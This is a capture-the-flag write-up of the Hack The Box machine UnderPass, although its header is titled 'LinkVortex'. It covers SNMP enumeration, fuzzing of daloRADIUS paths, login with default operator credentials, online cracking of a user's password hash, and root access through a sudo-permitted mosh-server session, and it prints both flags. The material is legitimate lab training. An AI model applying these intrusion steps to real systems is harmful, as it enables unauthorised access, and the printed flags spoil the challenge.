---
title: LinkVortex
date: 2025-05-27 12:26:00 +0100
categories: [ctf, htb]
tags: [web, linux, snmp, git] 
image: https://res.cloudinary.com/djo6idowf/image/upload/v1748340527/UnderPass_azxe64.png
---
[UnderPass](https://app.hackthebox.com/machines/UnderPass) is an Easy machine released on 21st December 2024 on Hack The Box.

User Flag: `3ad0f6ac29b0bd200f26357b50c60fd9`

Root Flag: `9fac61210e9fc964e61fd42f547290a9`

## Write-up

As we should do with every challenge, we must first use the almighty Nmap to find some open ports and try and get a grasp of what we are looking at.

`nmap -n -Pn -p- -sV -sT 10.10.11.48 -T4 --max-retries 1 --max-rtt-timeout 2s --ttl 50ms --open`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340527/image_zhxvpf.png)

Immediately after discovering that there is an Apache web server open on port `80` I go down a rabbit hole thinking that the SSH is vulnerable to username enumeration. It might be, I never found out.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340525/image_1_b7gtfw.png)

There isn't much to go on but `Username Enumeration` sounds promising? Is there a brute force angle?

[OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)](https://www.exploit-db.com/exploits/45210)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340524/image_2_hvoomv.png)

`nano openssh.py`

`python openssh.py 10.10.11.48 <username>`

After realizing that I fell for a classic blunder, I then tried to look for `robots.txt`but was surprised to find that it is not available to view.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340523/image_3_eunakv.png)

Time for some URL fuzzing because maybe there is something hidden that I can't see.

`gobuster dir -u http://10.10.11.48 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340523/image_4_olppvf.png)

We found one directory, but it is forbidden, and we can't view it. And based off of the name it doesn't appear to be that useful anyway, so who cares. Moving on.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340523/image_5_ovjoer.png)

I try some basic bypasses because at this point, I have no idea what I'm doing. None of them work.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340523/image_6_etxh3i.png)

After making some further attemps on Burp I realise that this is unlikely to be the path to an initial foothold. It's an Easy box after all, it shouldn't be too convoluted.

Let's do another Nmap scan. I think that the command that I used earlier was not great because it was optimized for Proxychains (I am also in the middle of working through Dante so I was utilising some commands from my notes there).

`nmap -n -Pn -p- -sV -sT 10.10.11.48`

It is a really slow scan. After a while realise it is too slow for an easy. Possibly the machine might be broken because nothing seems to obvious of what to do, resetting the machine. It could also be the lack of `sudo`for the command? Or it may be a UDP scan?!

`nmap -sU -A -T4 -Pn 10.10.11.48`

```
nmap -sU -A -T4 -Pn 10.10.11.48
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-27 17:15 EDT
Warning: 10.10.11.48 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.11.48
Host is up (0.077s latency).
Not shown: 983 closed udp ports (port-unreach)
PORT      STATE         SERVICE        VERSION
161/udp   open          snmp           SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: c7ad5c4856d1cf6600000000
|   snmpEngineBoots: 31
|_  snmpEngineTime: 24m16s
| snmp-sysdescr: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
|_  System uptime: 24m16.25s (145625 timeticks)
1020/udp  open|filtered unknown
1024/udp  open|filtered unknown
1066/udp  open|filtered fpo-fns
1812/udp  open|filtered radius
1813/udp  open|filtered radacct
2002/udp  open|filtered globe
9876/udp  open|filtered sd
17338/udp open|filtered unknown
18373/udp open|filtered unknown
18485/udp open|filtered unknown
23781/udp open|filtered unknown
27473/udp open|filtered unknown
32771/udp open|filtered sometimes-rpc6
34358/udp open|filtered unknown
34580/udp open|filtered unknown
54711/udp open|filtered unknown
Too many fingerprints match this host to give specific OS details
Network Distance: 2 hops
Service Info: Host: UnDerPass.htb is the only daloradius server in the basin!

TRACEROUTE (using port 19130/udp)
HOP RTT      ADDRESS
1   96.00 ms 10.10.14.1
2   96.00 ms 10.10.11.48

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1271.93 seconds
```

Port 161 - SNTP (Simple Network Management Protocol). We finally found something.

[SNMPv1,SNMPv2,SNMPv2c Pentesting](https://cyberkhalid.github.io/posts/snmp/)

We can then do some enumeration on with SnmpWalk.

`snmpwalk -v1 -c public 10.10.11.48`

```
iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (6963197) 19:20:31.97
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (6964307) 19:20:43.07
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 03 1C 17 15 23 00 2B 00 00
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 217
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
End of MIB
```

`5.15.0-126-generic`

`UnDerPass.htb`

Great, so we were able to enumerate some useful information. I then went down another rabbit hole by fixated on the kernel version because it just stuck out to me as insecure. It was, but it should not have been my focus because it relates more to privilege escalation than getting an initial foothold.

`searchsploit Linux 5.15.0`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340523/image_7_kyvxuj.png)

[Linux Kernel 5.8 < 5.16.11 - Local Privilege Escalation (DirtyPipe)](https://www.exploit-db.com/exploits/50808)

`msfconsole`

`use exploit/linux/local/cve_2022_0847_dirtypipe`

Ok so you need an active session - so this is likely a step after an initial foothold. So then going back to the snmp output from earlier there is a line in it that stands out: `UnderPass.htb is the only daloradius server in the basin!`. After doing some searching online I found that daloRadius is a type of web server. One I had never heard of before this box.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340522/image_8_p8xdin.png)

[daloRADIUS](https://www.daloradius.com/)

I then try to view some default daloRadius directories but they are forbidden. So we know they are there and live, we just don't have permission. That's absolutely fine, we can try and find a sub directory even further in that we have access to e.g. `underpass.htb/doloradius/<insert_directory_here>` .

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340522/image_9_icbq8j.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340522/image_10_ytpiph.png)

`git clone https://github.com/Zyad-Elsayed/wordlists.git`

`ffuf -u http://underpass.htb/doloradius/FUZZ -w ./wordlists/daloradius.list`

```
/.htaccess              [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 20ms]
/.htpasswd              [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 20ms]
/daloradius/            [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4ms]
/daloradius/.github/    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 20ms]
/daloradius/.github/ISSUE_TEMPLATE/ [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 24ms]
/daloradius/.gitignore  [Status: 200, Size: 221, Words: 1, Lines: 13, Duration: 16ms]
/daloradius/.htaccess   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 20ms]
/daloradius/.htpasswd   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 20ms]
/daloradius/Dockerfile  [Status: 200, Size: 2182, Words: 259, Lines: 81, Duration: 24ms]
/daloradius/Dockerfile-freeradius [Status: 200, Size: 1376, Words: 132, Lines: 53, Duration: 20ms]
/daloradius/Dockerfile-standalone [Status: 200, Size: 1207, Words: 162, Lines: 39, Duration: 24ms]
/daloradius/FAQS        [Status: 200, Size: 1428, Words: 247, Lines: 43, Duration: 20ms]
/daloradius/README.docker-standalone.md [Status: 200, Size: 1005, Words: 90, Lines: 31, Duration: 20ms]
/daloradius/ChangeLog   [Status: 200, Size: 24703, Words: 3653, Lines: 413, Duration: 28ms]
/daloradius/README.md   [Status: 200, Size: 9912, Words: 1181, Lines: 196, Duration: 16ms]
/daloradius/LICENSE     [Status: 200, Size: 18011, Words: 3039, Lines: 341, Duration: 24ms]
/daloradius/SECURITY.md [Status: 200, Size: 916, Words: 122, Lines: 15, Duration: 20ms]
/daloradius/app/        [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 24ms]
/daloradius/app/common/includes/ [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 24ms]
/daloradius/app/common/ [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 28ms]
/daloradius/app/operators/ [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 28ms]
/daloradius/app/operators/index.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 20ms]
/daloradius/app/operators/logout.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 24ms]
/daloradius/app/operators/login.php [Status: 200, Size: 2763, Words: 349, Lines: 98, Duration: 60ms]
/daloradius/app/users/  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 4ms]
/daloradius/app/users/index.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 24ms]
/daloradius/app/users/login.php [Status: 200, Size: 4421, Words: 660, Lines: 113, Duration: 124ms]
/daloradius/contrib/chilli/ [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 20ms]
/daloradius/contrib/    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 24ms]
/daloradius/contrib/chilli/portal-bluechipwireless/ [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 20ms]
/daloradius/contrib/chilli/portal1/ [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 24ms]
/daloradius/contrib/chilli/portal1/signup-paypal/index.php [Status: 200, Size: 182, Words: 17, Lines: 2, Duration: 24ms]
/daloradius/contrib/db/ [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 20ms]
/daloradius/contrib/chilli/portal1/signup-paypal/ [Status: 200, Size: 182, Words: 17, Lines: 2, Duration: 28ms]
/daloradius/contrib/db/fr3-mariadb-freeradius.sql [Status: 200, Size: 8419, Words: 2088, Lines: 240, Duration: 20ms]
/daloradius/contrib/docker/ [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 12ms]
/daloradius/contrib/heartbeat/ [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 8ms]
/daloradius/contrib/scripts/ [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 40ms]
/daloradius/doc/        [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 52ms]
/daloradius/docker-compose.yml [Status: 200, Size: 1537, Words: 360, Lines: 67, Duration: 40ms]
/daloradius/doc/install/ [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 52ms]
/daloradius/init-freeradius.sh [Status: 200, Size: 4079, Words: 330, Lines: 84, Duration: 52ms]
/daloradius/init.sh     [Status: 200, Size: 5025, Words: 539, Lines: 77, Duration: 44ms]
/daloradius/library/    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 64ms]
/daloradius/setup/      [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 72ms]
/daloradius/app/users/login.php [Status: 200, Size: 4421, Words: 660, Lines: 113, Duration: 68ms]
/daloradius/app/users/logout.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 60ms]
/daloradius/contrib/db/mariadb-daloradius.sql [Status: 200, Size: 1210160, Words: 317717, Lines: 10657, Duration: 24ms]
/daloradius/app         [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 20ms]
/daloradius             [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 20ms]
/server-status          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 20ms]
:: Progress: [472/472] :: Job [1/1] :: 82 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

Bingo. We get loads of status 200s so we can go ahead and have a look around and see if anything obvious sticks out. Ideally, we want to look for configuration scripts, login pages and the like. Initially there is a `.gitignore`file which eludes to a configuration file.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340521/image_11_jx3pmn.png)

Unfortunately, we are unable to read it. That's a shame.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340521/image_12_ofcpl2.png)

A Docker configuration file seems interesting, but it doesn't tell us anything that we want to know really. Always worth exploring though.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340521/image_13_bjm7wx.png)

Ok, the files we've found so far haven't been too interesting. We did however, find a login page from the directory busting earlier -`http://10.10.11.48/daloradius/app/users/login.php`.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340521/image_14_qbkzqq.png)

Default creds? Or perhaps `steve@underpass.htb`?

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340521/image_15_jwag7z.png)

Nope, didn't work.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340520/image_16_pkv594.png)

At this point I start combing back through the directory busting output again to see if I have missed anything. One file catches my eye: `10.10.11.48/daloradius/init.sh`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340520/image_17_wuh6oh.png)

`raduser:radpass`

I then gave them a go on the login page that we found but they didn't work. I then had ANOTHER look at the directory busting output and discovered a second login page but for `operaters - 10.10.11.48/daloradius/init.sh/daloradius/app/operators/login.php`.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340520/image_18_urcbow.png)

The default credentials worked for this page. Interesting twist.

`administrator:radius`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340519/image_19_tajeff.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340519/image_20_yktmvw.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340519/image_21_suwtex.png)

After doing some exploration I find some credentials, but alas, they don't work.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340521/image_22_z17hz6.png)

And then we do even more snooping and we find a list of usernames. Not only that but we have a password. Well, we think we do because the password is actually hashed, I just didn't know that originally I just thought it looked a bit funky.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340518/image_23_nntpal.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340519/image_24_hbg0pc.png)

`412DD4759978ACFCC81DEAB01B382403`

After this amazing blunder I then found an online hash cracker and go ahead and bust it wide open.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340518/image_25_p9pnoo.png)

`underwaterfriends`

Let's go ahead and login.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340518/image_26_iqxb5i.png)

Success! Quick search for the user flag, and then on to the DirtyPipe exploit.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340517/image_27_ge3uka.png)

What `sudo`commands can this user run?

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340517/image_28_rhp6u1.png)

It seems that we can use `/usr/bin/mosh-server`. And it gives us a convenient port and key to connect with. Nice and simple for us. And because it's running as root, if we grab this session then we will likely get a root shell.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340517/image_29_cc0sbs.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340516/image_32_ketfgu.png)

`mosh-client 127.0.0.1 60001`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340516/image_31_zrde4l.png)

Ok, bit annoying but we then put the key environmental variable in and then try again.

`export MOSH_KEY="MSacYabuL5MYD+n4KGe3yg"`

`mosh-client 127.0.0.1 60001`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340516/image_32_ketfgu.png)

`MOSH_KEY="MSacYabuL5MYD+n4KGe3yg" mosh-client 127.0.0.1 60001`

As one command....

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340516/image_33_hq9tek.png)

THE KEY HAS CHANGED - DO IT AGAIN.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340516/image_34_yedkdd.png)

Ok, the key changes fast so you need to find the key, copy and paste super-fast and then run the command. That's a really cheap trick and really frustrating to figure out. Always re-run your commands people.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340516/image_35_eouskl.png)

And with that we get a `root`session and the challenge is complete.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340516/image_36_sqj6zv.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1748340517/image_37_tpvt6p.png)

## Thoughts

Kind of annoying both with the UDP port scan and then the constantly changing key for the privilege escalation. We got there in the end but there were quite a few stumbles.